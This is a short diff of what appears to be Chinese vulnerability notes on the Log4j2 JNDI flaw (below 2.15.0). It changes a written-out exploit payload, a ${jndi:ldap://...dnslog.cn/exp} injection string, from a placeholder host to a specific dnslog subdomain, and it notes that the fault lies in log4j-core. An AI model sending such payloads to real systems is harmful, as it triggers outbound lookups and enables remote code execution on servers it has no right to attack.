@@ -16,7 +16,7 @@ log4j2<2.15.0
 EXP:
 
 ```
-参数名=${jndi:ldap://xxx.dnslog.cn/exp}
+参数名=${jndi:ldap://e1xhue.dnslog.cn/exp}
 ```
 
 其存在问题的点在log4j-core这个包，只要这个包的版本比较低，log4j-api这个版本无论多高都没用
